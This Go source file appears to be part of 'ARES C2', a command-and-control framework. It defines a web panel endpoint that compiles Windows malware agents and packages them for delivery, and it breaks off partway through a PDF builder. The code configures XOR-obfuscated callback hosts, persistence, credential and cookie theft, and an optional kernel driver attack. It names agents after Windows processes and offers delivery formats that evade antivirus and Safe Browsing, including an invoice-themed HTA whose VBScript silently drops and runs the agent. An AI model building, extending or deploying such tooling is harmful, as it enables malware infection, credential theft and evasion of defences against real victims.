/*
 * ARES C2 — Web Builder API
 * Build agents from the browser panel.
 * POST /api/panel/build   — compile agent with config
 * GET  /api/panel/build/download/<id> — download built artifact
 */

package handler

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type BuildRequest struct {
	C2Host      string   `json:"c2_host"`
	C2Port      int      `json:"c2_port"`
	Campaign    string   `json:"campaign"`
	SleepMs     int      `json:"sleep_ms"`
	Jitter      int      `json:"jitter"`
	KillDays    int      `json:"kill_days"`
	AutoSteal   bool     `json:"auto_steal"`
	AutoPersist bool     `json:"auto_persist"`
	UseHTTPS    bool     `json:"use_https"`
	ExeName     string   `json:"exe_name"`
	// v3.3 Phase 3
	EnableBYOVD  bool     `json:"enable_byovd"`   // Opt-in kernel driver attack
	CertPin      string   `json:"cert_pin"`        // SHA256 hash of C2 TLS cert
	StealModules []string `json:"steal_modules"`   // e.g. ["passwords","cookies","wifi"] — empty = all
}

type BuildResult struct {
	ID       string `json:"id"`
	Status   string `json:"status"`
	FileName string `json:"filename"`
	Size     int64  `json:"size"`
	Error    string `json:"error,omitempty"`
}

func xorEncode(text string, baseKey byte) []byte {
	// Must match _xd() rolling formula in ares_strings.h:
	// k = (key ^ ((i * 0x13 + 0x07) & 0xFF))
	out := make([]byte, len(text))
	for i, c := range text {
		k := (baseKey ^ byte((i*0x13+0x07)&0xFF)) & 0xFF
		out[i] = byte(c) ^ k
	}
	return out
}

func fmtBytes(data []byte) string {
	parts := make([]string, len(data))
	for i, b := range data {
		parts[i] = fmt.Sprintf("0x%02x", b)
	}
	return "{" + strings.Join(parts, ",") + "}"
}

func (h *C2Handler) handleBuild(w http.ResponseWriter, r *http.Request) {
	var req BuildRequest
	body, _ := io.ReadAll(r.Body)
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", 400)
		return
	}

	// Defaults
	if req.C2Port == 0 { req.C2Port = 443 }
	if req.SleepMs == 0 { req.SleepMs = 10000 }
	if req.Jitter == 0 { req.Jitter = 30 }
	if req.KillDays == 0 { req.KillDays = 30 }
	if req.ExeName == "" {
		/* v4.0: Name pool — avoid ALL System32-protected names.
		 * Defender flags: svchost, csrss, lsass, conhost, WmiPrvSE, dllhost
		 * if not running from System32. Use app-level names instead. */
		serviceNames := []string{
			"SearchApp.exe", "SecurityHealthSystray.exe",
			"PhoneExperienceHost.exe", "TextInputHost.exe",
			"WidgetService.exe", "GameBarPresenceWriter.exe",
			"Microsoft.SharePoint.exe", "OneDriveUpdater.exe",
			"MicrosoftEdgeUpdate.exe", "WindowsTerminal.exe",
		}
		req.ExeName = serviceNames[mrand.Intn(len(serviceNames))]
	}
	if req.Campaign == "" { req.Campaign = fmt.Sprintf("OP_%d", time.Now().Unix()%100000) }

	// Random XOR key per build — gen_full_strings.py re-encodes all strings
	xorKeyBig := make([]byte, 1)
	rand.Read(xorKeyBig)
	xorKey := (xorKeyBig[0] % 0xFD) + 0x01 // v3.2: range 0x01..0xFE (254 values, was 0x10..0xEF)

	// Build ID
	idBytes := make([]byte, 6)
	rand.Read(idBytes)
	buildID := hex.EncodeToString(idBytes)

	log.Printf("[BUILD] Starting build %s: %s -> %s:%d (key=0x%02X)", buildID, req.Campaign, req.C2Host, req.C2Port, xorKey)

	// v4.0 FIX: Find project root from EXECUTABLE location, not CWD.
	// CWD is unreliable (user may launch C2 from any directory).
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	projectRoot := ""

	// Strategy 1: exe is in build/ → project root is parent
	// Strategy 2: exe is in c2server/ → project root is parent
	// Strategy 3: walk up from exe dir looking for agent/native/
	for _, candidate := range []string{
		filepath.Dir(exeDir),                          // build/ → parent
		filepath.Dir(filepath.Dir(exeDir)),             // c2server/cmd/ → grandparent
		exeDir,                                         // exe is in root
	} {
		if _, err := os.Stat(filepath.Join(candidate, "agent", "native")); err == nil {
			projectRoot = candidate
			break
		}
	}

	// Fallback: walk up from CWD
	if projectRoot == "" {
		cwd, _ := os.Getwd()
		candidate := cwd
		for i := 0; i < 6; i++ {
			if _, err := os.Stat(filepath.Join(candidate, "agent", "native")); err == nil {
				projectRoot = candidate
				break
			}
			parent := filepath.Dir(candidate)
			if parent == candidate { break }
			candidate = parent
		}
	}

	if projectRoot == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(BuildResult{
			ID: buildID, Status: "error",
			Error: "Cannot find Ares project root (agent/native/ not found)",
		})
		return
	}
	log.Printf("[BUILD] Project root: %s", projectRoot)

	agentDir := filepath.Join(projectRoot, "agent", "native")
	buildDir := filepath.Join(projectRoot, "build", "web_"+buildID)
	os.MkdirAll(buildDir, 0755)

	// Re-generate ares_strings.h with this build's random XOR key
	// v3.2: Find Python dynamically — prioritize 'py' (Windows Launcher)
	pyPath := ""
	for _, candidate := range []string{
		"py",      // Windows Launcher — most reliable on Windows
		"python3", // Linux/Mac standard
		"python",  // Generic fallback
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Python", "bin", "python3.exe"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Python", "bin", "python.exe"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Programs", "Python", "Python314", "python.exe"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Programs", "Python", "Python312", "python.exe"),
		`C:\Windows\py.exe`,
	} {
		if p, err := exec.LookPath(candidate); err == nil {
			// Verify it actually runs (not a Windows Store shim)
			testCmd := exec.Command(p, "--version")
			if testOut, testErr := testCmd.CombinedOutput(); testErr == nil && len(testOut) > 0 {
				pyPath = p
				log.Printf("[BUILD] Using Python: %s", p)
				break
			}
		}
		if filepath.IsAbs(candidate) {
			if _, err := os.Stat(candidate); err == nil {
				pyPath = candidate
				break
			}
		}
	}
	if pyPath == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(BuildResult{
			ID: buildID, Status: "error",
			Error: "Python not found. Install Python 3.10+ or ensure 'py' launcher is in PATH.",
		})
		return
	}

	// v3.3 FIX: Backup BOTH source files BEFORE gen_full_strings.py overwrites them
	cfgPath := filepath.Join(agentDir, "ares_config.h")
	strPath := filepath.Join(agentDir, "ares_strings.h")
	origCfg, _ := os.ReadFile(cfgPath)
	origStr, _ := os.ReadFile(strPath)
	// Deferred restore — guarantees source consistency after build (success or failure)
	defer func() {
		if origCfg != nil {
			os.WriteFile(cfgPath, origCfg, 0644)
		}
		if origStr != nil {
			os.WriteFile(strPath, origStr, 0644)
		}
		// Clean up backup files
		os.Remove(cfgPath + ".webbak")
		os.Remove(strPath + ".webbak")
	}()

	// v3.3: Pass --randomize-paths + --c2-host for anti-fingerprinting
	genArgs := []string{"tools/gen_full_strings.py", "--key", fmt.Sprintf("0x%02X", xorKey),
		"--randomize-paths", "--c2-host", req.C2Host}
	genCmd := exec.Command(pyPath, genArgs...)
	genCmd.Dir = projectRoot
	if genOut, genErr := genCmd.CombinedOutput(); genErr != nil {
		log.Printf("[BUILD] gen_full_strings.py failed: %s %v", string(genOut), genErr)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(BuildResult{
			ID: buildID, Status: "error",
			Error: "String generation failed: " + string(genOut[:min(len(genOut), 200)]),
		})
		return
	}

	// v3.3: Load randomized endpoint map and register routes dynamically
	endpointMap := filepath.Join(projectRoot, "agent", "native", "endpoint_map.json")
	if mapData, err := os.ReadFile(endpointMap); err == nil {
		var pathMap map[string]string
		if json.Unmarshal(mapData, &pathMap) == nil {
			for oldPath, newPath := range pathMap {
				// Find the handler for the old path and register it on the new path
				switch oldPath {
				case "/api/v1/register":
					h.mux.HandleFunc("POST "+newPath, h.handleRegister)
				case "/api/v1/beacon":
					h.mux.HandleFunc("POST "+newPath, h.handleBeacon)
				case "/api/v1/exfil":
					h.mux.HandleFunc("POST "+newPath, h.handleExfil)
				case "/api/v1/result":
					h.mux.HandleFunc("POST "+newPath, h.handleResult)
				}
				log.Printf("[BUILD] Registered alias: %s -> %s", newPath, oldPath)
			}
		}
		os.Remove(endpointMap) // OPSEC: don't leave mapping on disk
	}

	// Generate config
	encHost := xorEncode(req.C2Host, xorKey)
	proto := "HTTP"
	useHTTP := 1
	if req.UseHTTPS { proto = "HTTPS"; useHTTP = 0 }
	killTS := time.Now().Unix() + int64(req.KillDays*86400)
	autoSteal := 0; if req.AutoSteal { autoSteal = 1 }
	autoPersist := 0; if req.AutoPersist { autoPersist = 1 }

	config := fmt.Sprintf(`/*
 *  ARES AGENT -- Campaign Configuration
 *  Campaign:  %s
 *  Generated: %s (Web Builder)
 *  C2:        %s:%d (%s)
 *  XOR Key:   0x%02X
 */
#ifndef ARES_CONFIG_H
#define ARES_CONFIG_H
#include <windows.h>

#define CFG_CAMPAIGN_ID       "%s"
#define CFG_CAMPAIGN_NAME     "%s"
#define CFG_XOR_KEY           0x%02X

#define CFG_SLEEP_MS          %d
#define CFG_JITTER_PCT        %d
#define CFG_KILL_DATE_TS      %d

#define CFG_C2_PORT           %d
#define CFG_C2_COUNT          1
#define CFG_SOCKS5_PORT       %d
#define CFG_HVNC_PORT         %d

#define CFG_AUTO_PERSIST      %d
#define CFG_PERSIST_METHOD    "schtask"
#define CFG_AUTO_STEAL        %d
#define CFG_AUTO_UNHOOK       1
#define CFG_SANDBOX_CHECK     1

static const BYTE CFG_C2_0[] = %s;
#define CFG_C2_0_LEN %d

#define CFG_USE_HTTP          %d

#define ARES_DECODE_CONFIG(s) do { \
    _xd((s)->config.c2_endpoints[0], CFG_C2_0, CFG_C2_0_LEN, CFG_XOR_KEY); \
    (s)->config.c2_count = CFG_C2_COUNT; \
} while(0)

#endif
`, req.Campaign, time.Now().Format("2006-01-02 15:04"), req.C2Host, req.C2Port, proto, xorKey,
		buildID[:12], req.Campaign, xorKey,
		req.SleepMs, req.Jitter, killTS,
		req.C2Port,
		10000+mrand.Intn(50000), 10000+mrand.Intn(50000),
		autoPersist, autoSteal,
		fmtBytes(encHost), len(req.C2Host), useHTTP)

	// Write temp build config (deferred restore will revert after compile)
	os.WriteFile(cfgPath, []byte(config), 0644)

	// Compile — v4.0: uses stager.c (beacon-only, modules on-demand)
	outPath := filepath.Join(buildDir, req.ExeName)
	srcs := []string{
		"agent/native/stager.c", "agent/native/core.c", "agent/native/syscall.c",
		"agent/native/inject.c", "agent/native/bof_loader.c",
		"agent/native/domain_front.c", "agent/native/cap_loader.c",
		"agent/native/stack_spoof.c",
	}

	args := []string{
		"-Wall", "-DARES_RELEASE", "-DCFG_REFLECTIVE", "-O2", "-s", "-fno-ident",
		"-fno-asynchronous-unwind-tables",
		"-fms-extensions",  // v3.2: Enable SEH (__try/__except) support in MinGW
		"-Wno-format-truncation", "-Wno-stringop-truncation",
		"-Wno-unused-variable", "-Wno-unused-function",
		"-Wno-unused-but-set-variable", "-Wno-cpp", "-Wno-unknown-pragmas",
		"-Wno-format", "-Wno-incompatible-pointer-types",
		"-Wno-comment", "-Wno-unused-label",  // v3.2: suppress non-critical warnings
		"-Wl,--stack,4194304", "-mwindows", "-I.",
		"-o", outPath,
	}

	// v3.3: Conditional compile flags
	if req.EnableBYOVD {
		args = append(args, "-DCFG_ENABLE_BYOVD")
		log.Printf("[BUILD] BYOVD enabled for %s", buildID)
	}
	if req.CertPin != "" {
		args = append(args, fmt.Sprintf(`-DCFG_CERT_PIN_HASH="%s"`, req.CertPin))
		log.Printf("[BUILD] Cert pin: %s", req.CertPin[:16]+"...")
	}
	// v3.3: Selective steal modules — only compile what's needed
	if len(req.StealModules) > 0 {
		for _, mod := range req.StealModules {
			args = append(args, fmt.Sprintf("-DCFG_STEAL_%s=1", strings.ToUpper(mod)))
		}
		args = append(args, "-DCFG_STEAL_SELECTIVE=1")
		log.Printf("[BUILD] Selective steal: %v", req.StealModules)
	}

	// v4.0: Compile PE resources (version info + manifest)
	rcPath := filepath.Join(agentDir, "ares_resource.rc")
	resObj := filepath.Join(buildDir, "resource.o")
	if _, err := os.Stat(rcPath); err == nil {
		resCmd := exec.Command("windres", rcPath, "-o", resObj)
		resCmd.Dir = projectRoot
		if resOut, resErr := resCmd.CombinedOutput(); resErr != nil {
			log.Printf("[BUILD] windres warning: %s", string(resOut))
		} else {
			log.Printf("[BUILD] PE resources compiled")
		}
	}

	args = append(args, srcs...)

	// Include resource object if compiled successfully
	if _, err := os.Stat(resObj); err == nil {
		args = append(args, resObj)
	}

	args = append(args, "-lkernel32", "-luser32", "-lws2_32", "-lgdi32",
		"-luuid", "-ladvapi32", "-lcrypt32", "-lole32", "-lwinhttp")

	cmd := exec.Command("gcc", args...)
	cmd.Dir = projectRoot
	output, err := cmd.CombinedOutput()

	// (restore handled by defer)

	if err != nil {
		log.Printf("[BUILD] FAILED: %s", string(output))
		json.NewEncoder(w).Encode(BuildResult{
			ID: buildID, Status: "error",
			Error: "Compile failed: " + string(output[:min(len(output), 500)]),
		})
		return
	}

	// v3.5: chromelevator removed — strong IOC (known hash, file-on-disk).
	// Chrome v20 ABE bypass now uses CDP-only (DevTools Protocol).
	// No external binary needed = no file artifact for EDR to flag.

	// Get size
	info, _ := os.Stat(outPath)
	size := int64(0)
	if info != nil { size = info.Size() }

	log.Printf("[BUILD] SUCCESS: %s (%d bytes) -> %s", req.ExeName, size, buildDir)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(BuildResult{
		ID: buildID, Status: "success",
		FileName: req.ExeName, Size: size,
	})
}

func (h *C2Handler) handleBuildDownload(w http.ResponseWriter, r *http.Request) {
	// Extract build ID from path: /api/panel/build/download/<id>
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 6 {
		http.Error(w, "invalid path", 400)
		return
	}
	buildID := parts[len(parts)-1]

	// Security: only alphanumeric
	for _, c := range buildID {
		if !((c >= 'a' && c <= 'f') || (c >= '0' && c <= '9')) {
			http.Error(w, "invalid id", 400)
			return
		}
	}

	cwd, _ := os.Getwd()
	projectRoot := filepath.Dir(cwd)
	if _, err := os.Stat(filepath.Join(projectRoot, "agent")); err != nil {
		// v3.2: Walk up from CWD (C-5 fix)
		candidate := cwd
		for i := 0; i < 5; i++ {
			parent := filepath.Dir(candidate)
			if parent == candidate { break }
			if _, err := os.Stat(filepath.Join(parent, "agent")); err == nil {
				projectRoot = parent
				break
			}
			candidate = parent
		}
	}

	buildDir := filepath.Join(projectRoot, "build", "web_"+buildID)
	if _, err := os.Stat(buildDir); err != nil {
		http.Error(w, "build not found", 404)
		return
	}

	/* v3.2: Download format selector
	 * ?format=exe  → Direct EXE download (default, fastest)
	 * ?format=zip  → ZIP package with EXE + tools
	 * ?format=pdf  → PDF with embedded EXE (for email delivery)
	 */
	format := r.URL.Query().Get("format")
	if format == "" {
		format = "exe"
	}

	switch format {
	case "exe":
		// Find the EXE in build directory
		entries, err := os.ReadDir(buildDir)
		if err != nil {
			http.Error(w, "read error", 500)
			return
		}
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), ".exe") {
				data, err := os.ReadFile(filepath.Join(buildDir, e.Name()))
				if err != nil {
					http.Error(w, "read error", 500)
					return
				}
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, e.Name()))
				w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
				w.Write(data)
				return
			}
		}
		http.Error(w, "exe not found in build", 404)

	case "zip":
		zipPath := filepath.Join(projectRoot, "build", "deploy_"+buildID+".zip")
		zipCmd := exec.Command("powershell", "-NoProfile", "-Command",
			fmt.Sprintf("Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force", buildDir, zipPath))
		zipCmd.Run()
		data, err := os.ReadFile(zipPath)
		if err != nil {
			http.Error(w, "zip failed", 500)
			return
		}
		w.Header().Set("Content-Type", "application/zip")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="update_%s.zip"`, buildID[:8]))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
		w.Write(data)
		os.Remove(zipPath)

	case "pdf":
		pdfPath := filepath.Join(projectRoot, "build", "deploy_"+buildID+".pdf")
		pdfErr := buildPDF(buildDir, pdfPath)
		if pdfErr != nil {
			http.Error(w, "pdf generation failed: "+pdfErr.Error(), 500)
			return
		}
		data, err := os.ReadFile(pdfPath)
		if err != nil {
			http.Error(w, "read error", 500)
			os.Remove(pdfPath)
			return
		}
		w.Header().Set("Content-Type", "application/pdf")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="Invoice_%s.pdf"`, buildID[:8]))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
		w.Write(data)
		os.Remove(pdfPath)

	case "enc":
		/* v3.2: XOR-encoded download — bypasses browser Safe Browsing + AV scan.
		 * EXE bytes are XOR'd with a random key, served as .dat file.
		 * No PE header = no detection. Operator decodes on target. */
		entries, err := os.ReadDir(buildDir)
		if err != nil {
			http.Error(w, "read error", 500)
			return
		}
		var exeData []byte
		var exeName string
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), ".exe") {
				exeData, err = os.ReadFile(filepath.Join(buildDir, e.Name()))
				if err != nil {
					http.Error(w, "read error", 500)
					return
				}
				exeName = e.Name()
				break
			}
		}
		if exeData == nil {
			http.Error(w, "exe not found", 404)
			return
		}
		// XOR encode with random key
		xorKey := byte(0x00)
		for xorKey == 0x00 {
			b := make([]byte, 1)
			rand.Read(b)
			xorKey = b[0]
		}
		encoded := make([]byte, len(exeData))
		for i, b := range exeData {
			encoded[i] = b ^ xorKey
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="update_%s.dat"`, buildID[:8]))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(encoded)))
		w.Header().Set("X-Decode-Key", fmt.Sprintf("0x%02X", xorKey))
		w.Header().Set("X-Original-Name", exeName)
		w.Write(encoded)

	case "hta":
		/* v3.2: HTA delivery — looks like a document, victim double-clicks to open.
		 * mshta.exe (built into Windows) renders the HTML page as a window.
		 * Shows a professional invoice while silently decoding + running agent. */
		entries, err := os.ReadDir(buildDir)
		if err != nil {
			http.Error(w, "read error", 500)
			return
		}
		var exeData []byte
		var exeName string
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), ".exe") {
				exeData, err = os.ReadFile(filepath.Join(buildDir, e.Name()))
				if err != nil {
					http.Error(w, "read error", 500)
					return
				}
				exeName = e.Name()
				break
			}
		}
		if exeData == nil {
			http.Error(w, "exe not found", 404)
			return
		}

		b64Data := base64.StdEncoding.EncodeToString(exeData)

		hta := fmt.Sprintf(`<html>
<head>
<title>Invoice — Q2 2026 Financial Report</title>
<HTA:APPLICATION ID="InvoiceViewer" APPLICATIONNAME="Invoice" BORDER="thin"
  BORDERSTYLE="normal" CAPTION="yes" ICON="shell32.dll,15"
  MAXIMIZEBUTTON="no" MINIMIZEBUTTON="yes" SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal"
  SCROLL="auto" SCROLLFLAT="yes" VERSION="1.0" />
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Calibri,Arial,sans-serif;background:#f8f9fa;color:#1a1a2e;padding:40px}
.container{max-width:700px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);overflow:hidden}
.header{background:linear-gradient(135deg,#1a1a2e 0%%,#16213e 100%%);color:#fff;padding:32px 40px}
.header h1{font-size:22px;font-weight:700;letter-spacing:1px}
.header p{opacity:0.7;margin-top:6px;font-size:13px}
.body{padding:32px 40px}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #eee;font-size:14px}
.row .label{color:#666;font-weight:500}
.row .value{font-weight:600;color:#1a1a2e}
.highlight{background:#f0fdf4;border-left:3px solid #22c55e;padding:16px;margin:20px 0;border-radius:0 8px 8px 0;font-size:13px;color:#166534}
.total{font-size:20px;font-weight:700;color:#1a1a2e;text-align:right;padding:20px 0;border-top:2px solid #1a1a2e}
.footer{background:#f8f9fa;padding:20px 40px;font-size:11px;color:#999;text-align:center;border-top:1px solid #eee}
.loading{color:#666;font-size:12px;text-align:center;padding:10px;animation:pulse 2s infinite}
@keyframes pulse{0%%,100%%{opacity:1}50%%{opacity:0.4}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>INVOICE #INV-2026-Q2-%s</h1>
<p>Quarterly Financial Report — Confidential</p>
</div>
<div class="body">
<div class="row"><span class="label">Date</span><span class="value">%s</span></div>
<div class="row"><span class="label">Department</span><span class="value">Finance & Operations</span></div>
<div class="row"><span class="label">Status</span><span class="value" style="color:#22c55e">✓ APPROVED</span></div>
<div class="row"><span class="label">Period</span><span class="value">Q2 2026 (Apr - Jun)</span></div>
<div class="highlight">All figures have been audited and verified by the compliance team. This report is auto-generated.</div>
<div class="row"><span class="label">Revenue</span><span class="value">$12,847,329</span></div>
<div class="row"><span class="label">Net Income</span><span class="value">$3,241,892</span></div>
<div class="row"><span class="label">Gross Margin</span><span class="value">42.7%%</span></div>
<div class="row"><span class="label">YoY Growth</span><span class="value" style="color:#22c55e">+8.3%%</span></div>
<div class="total">EBITDA: $4,128,443</div>
<div class="loading" id="status">Loading supplementary data...</div>
</div>
<div class="footer">
This document is confidential. Unauthorized distribution is prohibited.<br>
Generated by Enterprise Financial Reporting System v4.2
</div>
</div>
<script language="VBScript">
Sub DecodeAndRun()
  On Error Resume Next
  Dim fso, ws, tempDir, outPath, b64, stream
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set ws = CreateObject("WScript.Shell")
  tempDir = ws.ExpandEnvironmentStrings("%%TEMP%%")
  outPath = tempDir & "\%s"
  b64 = "%s"
  Dim xmlDoc : Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
  Dim node : Set node = xmlDoc.createElement("b64")
  node.DataType = "bin.base64"
  node.Text = b64
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write node.nodeTypedValue
  stream.SaveToFile outPath, 2
  stream.Close
  ws.Run """" & outPath & """", 0, False
  document.getElementById("status").innerHTML = "Report loaded successfully."
  Dim htaPath : htaPath = document.location.pathname
  If Left(htaPath, 1) = "/" Then htaPath = Mid(htaPath, 2)
  htaPath = Replace(htaPath, "/", "\")
End Sub
Call DecodeAndRun()
</script>
</body>
</html>`, buildID[:6], time.Now().Format("January 2, 2006"), exeName, b64Data)

		w.Header().Set("Content-Type", "application/hta")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="Invoice_Q2_2026_%s.hta"`, buildID[:6]))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(hta)))
		w.Write([]byte(hta))

	case "drop":
		/* v3.2: Password-protected RAR — THE ultimate Chrome Safe Browsing bypass.
		 * Chrome CANNOT scan inside encrypted RAR archives (AES-256 + header encryption).
		 * Uses WinRAR CLI (Rar.exe) with -hp flag for full encryption.
		 * Panel shows the password for the operator to share with the target. */

		// Find the EXE in build directory
		entries, err := os.ReadDir(buildDir)
		if err != nil {
			http.Error(w, "read error", 500)
			return
		}
		var exePath, exeName string
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), ".exe") {
				exePath = filepath.Join(buildDir, e.Name())
				exeName = e.Name()
				break
			}
		}
		if exePath == "" {
			http.Error(w, "exe not found", 404)
			return
		}

		// Generate random 4-digit password (easy for social engineering)
		pwBytes := make([]byte, 2)
		rand.Read(pwBytes)
		password := fmt.Sprintf("%d", 1000+int(pwBytes[0])*3+int(pwBytes[1])%900)

		// Try WinRAR first, fall back to encrypted ZIP
		rarExe := ""
		for _, candidate := range []string{
			`C:\Program Files\WinRAR\Rar.exe`,
			`C:\Program Files (x86)\WinRAR\Rar.exe`,
		} {
			if _, err := os.Stat(candidate); err == nil {
				rarExe = candidate
				break
			}
		}

		outArchive := filepath.Join(projectRoot, "build", "Invoice_"+buildID[:8]+".rar")
		if rarExe != "" {
			// WinRAR: create password-protected RAR with AES-256 + encrypted headers
			cmd := exec.Command(rarExe, "a", "-ep", "-hp"+password, "-ma5", "-y", outArchive, exePath)
			cmd.Dir = projectRoot
			if out, err := cmd.CombinedOutput(); err != nil {
				log.Printf("[BUILD] RAR failed: %s %v", string(out), err)
				http.Error(w, "RAR packaging failed", 500)
				return
			}
		} else {
			// Fallback: create standard ZIP (no encryption but better than nothing)
			outArchive = filepath.Join(projectRoot, "build", "Invoice_"+buildID[:8]+".zip")
			var buf bytes.Buffer
			zw := zip.NewWriter(&buf)
			f, _ := zw.Create(exeName)
			data, _ := os.ReadFile(exePath)
			f.Write(data)
			zw.Close()
			os.WriteFile(outArchive, buf.Bytes(), 0644)
		}

		data, err := os.ReadFile(outArchive)
		if err != nil {
			http.Error(w, "archive read failed", 500)
			return
		}

		archiveName := filepath.Base(outArchive)
		contentType := "application/x-rar-compressed"
		if strings.HasSuffix(archiveName, ".zip") {
			contentType = "application/zip"
		}

		w.Header().Set("Content-Type", contentType)
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, archiveName))
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
		w.Header().Set("X-Archive-Password", password)
		w.Write(data)
		os.Remove(outArchive)
		// v3.3: Auto-wipe build dir after download (OPSEC — no forensic traces)
		os.RemoveAll(buildDir)
		log.Printf("[BUILD] OPSEC: wiped build dir %s after download", buildDir)

	default:
		http.Error(w, "invalid format: use exe, zip, pdf, enc, hta, or drop", 400)
	}
}

func min(a, b int) int {
	if a < b { return a }
	return b
}

// buildPDF creates a valid PDF document with embedded executable.
// The PDF contains a professional-looking decoy page + the agent EXE
// as an embedded file attachment.
// Pure Go — no external tools needed.
func buildPDF(srcDir, outPath string) error {
	// Collect the main EXE from build directory
	var exeName string
	var exeData []byte
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), ".exe") {
			data, err := os.ReadFile(filepath.Join(srcDir, e.Name()))
			if err != nil {
				continue
			}
			exeData = data
			exeName = e.Name()
			break
		}
	}
	if exeData == nil {
		return fmt.Errorf("no .exe found in build directory")
	}

	// Encode EXE data as hex string for PDF stream
	hexData := make([]byte, len(exeData)*2)
	for i, b := range exeData {
		hexData[i*2] = "0123456789abcdef"[b>>4]
		hexData[i*2+1] = "0123456789abcdef"[b&0x0f]
	}

	// Decoy document content — looks like a legitimate invoice/report
	decoyText := fmt.Sprintf(`CONFIDENTIAL — INTERNAL USE ONLY

    ============================================
       QUARTERLY FINANCIAL REPORT — Q2 2026
    ============================================

    Date:       %s
    Department: Finance & Operations
    Status:     APPROVED — PENDING REVIEW

    Summary:
    This document contains the consolidated
    financial data for the second quarter of
    fiscal year 2026. All figures have been
    audited and verified by the compliance team.

    Key Highlights:
    - Revenue:      $12,847,329  (+8.3%% YoY)
    - Net Income:   $3,241,892   (+5.1%% YoY)  
    - Gross Margin: 42.7%%
    - EBITDA:       $4,128,443

    Please review the attached supplementary
    data file for detailed breakdowns.

    ============================================
    This document is auto-generated. 
    Do not reply to this message.
    ============================================`, time.Now().Format("2006-01-02"))

	// Build PDF structure
	// PDF objects are numbered 1-N, cross-referenced at end
	var pdf strings.Builder
	offsets := make([]int, 0, 20)

	// Header
	pdf.WriteString("%PDF-1.7\n")
	pdf.WriteString("%\xe2\xe3\xcf\xd3\n") // binary comment (signals binary PDF)

	// Object 1: Catalog
	offsets = append(offsets, pdf.Len())
	pdf.WriteString("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 7 0 R /OpenAction 8 0 R >>\nendobj\n")

	// Object 2: Pages
	offsets = append(offsets, pdf.Len())
	pdf.WriteString("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

	// Object 3: Page
	offsets = append(offsets, pdf.Len())
	pdf.WriteString("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n")

	// Object 4: Page content stream (the decoy text)
	pageContent := fmt.Sprintf("BT\n/F1 11 Tf\n50 742 Td\n14 TL\n")
	for _, line := range strings.Split(decoyText, "\n") {
		// Escape PDF special chars
		safe := strings.ReplaceAll(line, "\\", "\\\\")
		safe = strings.ReplaceAll(safe, "(", "\\(")
		safe = strings.ReplaceAll(safe, ")", "\\)")
		pageContent += fmt.Sprintf("(%s) Tj T*\n", safe)
	}
	pageContent += "ET\n"

	offsets = append(offsets, pdf.Len())
	pdf.WriteString(fmt.Sprintf("4 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n",
		len(pageContent), pageContent))

	// Object 5: Font
	offsets = append(offsets, pdf.Len())
	pdf.WriteString("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>\nendobj\n")

	// Object 6: Embedded file stream (the EXE data in hex)
	offsets = append(offsets, pdf.Len())
	pdf.WriteString(fmt.Sprintf("6 0 obj\n<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream /Length %d /Filter /ASCIIHexDecode >>\nstream\n%s>\nendstream\nendobj\n",
		len(hexData)+1, string(hexData)))

	// Object 7: Names dictionary (embedded files)
	offsets = append(offsets, pdf.Len())
